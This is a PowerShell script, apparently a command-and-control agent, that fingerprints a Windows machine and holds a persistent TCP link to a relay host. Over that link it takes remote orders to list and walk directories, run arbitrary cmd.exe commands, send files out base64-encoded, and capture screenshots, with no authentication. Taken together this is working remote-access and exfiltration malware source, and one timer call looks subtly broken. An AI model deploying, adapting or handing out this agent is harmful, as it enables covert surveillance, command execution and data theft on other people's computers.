param([string]$Server = "", [int]$Port = 0)

$C2Dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$DataDir = "$env:USERPROFILE\.chatbox-c2"
$null = New-Item -ItemType Directory -Path $DataDir -Force

# Machine identity
$idPath = "$DataDir\machine-id"
if (-not (Test-Path $idPath)) {
  $id = -join ((48..57)+(97..102) | Get-Random -Count 8 | % { [char]$_ })
  [System.IO.File]::WriteAllText($idPath, $id)
}
$InstanceId = [System.IO.File]::ReadAllText($idPath).Trim()
$Hostname = $env:COMPUTERNAME
$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$Os = (Get-WmiObject Win32_OperatingSystem).Caption

# Config
if (-not $Server) {
  $cfgPath = "$C2Dir\server.cfg"
  if (Test-Path $cfgPath) {
    $lines = [System.IO.File]::ReadAllLines($cfgPath)
    foreach ($line in $lines) {
      if ($line -match '^([^=]+)=(.+)$') {
        if ($matches[1] -eq 'RELAY_IP') { $Server = $matches[2] }
        if ($matches[1] -eq 'RELAY_PORT') { $Port = [int]$matches[2] }
      }
    }
  }
}
if (-not $Server) { $Server = "100.104.20.122" }
if ($Port -eq 0) { $Port = 15000 }

# Detect drives
function Get-Drives {
  $d = @()
  Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
    $d += @{drive = $_.DeviceID; total = [math]::Floor($_.Size/1GB); free = [math]::Floor($_.FreeSpace/1GB)}
  }
  return $d
}

$Drives = Get-Drives
$TailscaleIP = ""

# Detect Tailscale
try {
  $out = & "C:\Program Files\Tailscale\tailscale.exe" ip -4 2>$null
  if ($LASTEXITCODE -eq 0 -and $out) { $TailscaleIP = $out.Trim() }
} catch {}

function Write-Log {
  param($Msg)
  try { [System.IO.File]::AppendAllText("$DataDir\agent.log", "[$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ')] $Msg`n") } catch {}
}

# === TCP Connection ===
$Socket = $null
$Stream = $null
$Buffer = New-Object byte[] 65536
$InBuf = ""
$ReconnectDelay = 5000
$HbTimer = $null

function Send-Message {
  param($Obj)
  try {
    $json = (ConvertTo-Json $Obj -Compress) + "`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    if ($Stream -and $Stream.CanWrite) {
      $Stream.Write($bytes, 0, $bytes.Length)
      $Stream.Flush()
    }
  } catch {}
}

function Send-Heartbeat {
  $info = @{
    type = "heartbeat"
    id = $InstanceId
    hostname = $Hostname
    ip = $TailscaleIP
    drives = $Drives
    os = $Os
    uptime = [math]::Floor([Environment]::TickCount / 3600000)
    arch = $Arch
  }
  Send-Message $info
}

function Handle-Command {
  param($Msg)
  $cmd = $Msg.cmd
  $argsVal = $Msg.args
  $replyId = $Msg.replyId
  $target = $Msg.target
  if ($target -ne $InstanceId) { return }

  $result = ""
  try {
    switch ($cmd) {
      "ls" {
        $dir = if ($argsVal) { $argsVal } else { "C:\" }
        $items = Get-ChildItem -Path $dir -ErrorAction Stop | ForEach-Object {
          @{name = $_.Name; dir = $_.PsIsContainer; size = if ($_.PsIsContainer) { 0 } else { $_.Length }}
        }
        $result = ConvertTo-Json $items -Depth 5
      }
      "tree" {
        $parts = ($argsVal -split '\|')
        $dir = if ($parts[0]) { $parts[0] } else { "C:\" }
        $maxDepth = if ($parts[1]) { [int]$parts[1] } else { 5 }
        function Build-Tree($d, $depth) {
          if ($depth -gt $maxDepth) { return "  " * $depth + "...`n" }
          $out = ""
          try {
            Get-ChildItem -Path $d -ErrorAction Stop | ForEach-Object {
              $tag = if ($_.PsIsContainer) { "[DIR]" } else { "[FIL]" }
              $out += "  " * $depth + $tag + " " + $_.Name + "`n"
              if ($_.PsIsContainer) { $out += Build-Tree $_.FullName ($depth + 1) }
            }
          } catch {}
          return $out
        }
        $result = Build-Tree $dir 0
      }
      "listall" {
        $parts = ($argsVal -split '\|')
        $dir = if ($parts[0]) { $parts[0] } else { "C:\" }
        $maxDepth = if ($parts[1]) { [int]$parts[1] } else { 10 }
        $results = [System.Collections.ArrayList]@()
        function Walk-Dir($d, $depth) {
          if ($depth -gt $maxDepth) { return }
          try {
            Get-ChildItem -Path $d -ErrorAction Stop | ForEach-Object {
              $item = @{
                name = $_.Name
                path = $_.FullName
                dir = $_.PsIsContainer
                size = if ($_.PsIsContainer) { 0 } else { $_.Length }
                mtime = $_.LastWriteTime.ToString("yyyy-MM-ddTHH:mm:ssZ")
              }
              $null = $results.Add($item)
              if ($_.PsIsContainer) { Walk-Dir $_.FullName ($depth + 1) }
            }
          } catch {}
        }
        Walk-Dir $dir 0
        $result = ConvertTo-Json $results -Depth 5
      }
      "exec" {
        $out = & cmd.exe /c $argsVal 2>&1 | Out-String
        $result = $out
      }
      "dl" {
        $filePath = $argsVal
        if (Test-Path -LiteralPath $filePath -PathType Container) { $result = "Error: Cannot download a directory"; break }
        $file = Get-Item -LiteralPath $filePath -ErrorAction Stop
        if ($file.Length -gt 50MB) { $result = "Error: File too large ($([math]::Round($file.Length/1MB))MB > 50MB limit)"; break }
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $b64 = [Convert]::ToBase64String($bytes)
        $result = "{`"name`":`"$($file.Name)`",`"size`":$($file.Length),`"data`":`"$b64`"}"
      }
      "screenshot" {
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $gfx = [System.Drawing.Graphics]::FromImage($bmp)
        $gfx.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $gfx.Dispose()
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()
        $b64 = [Convert]::ToBase64String($ms.ToArray())
        $len = $ms.Length
        $ms.Dispose()
        $result = "{`"name`":`"screenshot.png`",`"size`":$len,`"data`":`"$b64`"}"
      }
      default { $result = "Unknown command: $cmd" }
    }
  } catch {
    $result = "Error: $($_.Exception.Message)"
  }
  Send-Message @{type = "cmdResult"; replyId = $replyId; target = $InstanceId; data = $result}
}

function Connect {
  try {
    if ($Socket) { try { $Socket.Close() } catch {} }
    $Script:Socket = New-Object System.Net.Sockets.TcpClient
    $Socket.Connect($Server, $Port)
    $Script:Stream = $Socket.GetStream()
    $Script:ReconnectDelay = 5000
    $Script:InBuf = ""
    Send-Heartbeat
    if ($HbTimer) { [System.Threading.Timer]::Stop($HbTimer) }
    $Script:HbTimer = [System.Threading.Timer]::new(
      { Send-Heartbeat }, $null, 120000, 120000
    )
    Start-Receive
  } catch {
    Write-Log "Connect failed: $_"
    Start-Sleep -Milliseconds $ReconnectDelay
    $Script:ReconnectDelay = [math]::Min(30000, $ReconnectDelay * 2)
    Connect
  }
}

function Start-Receive {
  try {
    while ($Socket.Connected) {
      $read = $Socket.Available
      if ($read -gt 0) {
        $bytes = New-Object byte[] $read
        $null = $Stream.Read($bytes, 0, $read)
        $Script:InBuf += [System.Text.Encoding]::UTF8.GetString($bytes)
        $lines = $InBuf -split "`n"
        $Script:InBuf = $lines[-1]
        for ($i = 0; $i -lt $lines.Count - 1; $i++) {
          if ($lines[$i].Trim()) {
            try {
              $msg = ConvertFrom-Json $lines[$i]
              Handle-Command $msg
            } catch {}
          }
        }
      }
      Start-Sleep -Milliseconds 100
    }
  } catch {}
  # Disconnected
  $Script:Socket = $null
  $Script:Stream = $null
  Connect
}

Write-Log "Agent starting: $InstanceId@$Server`:$Port"
Connect

# Keep alive
while ($true) { Start-Sleep -Seconds 10 }
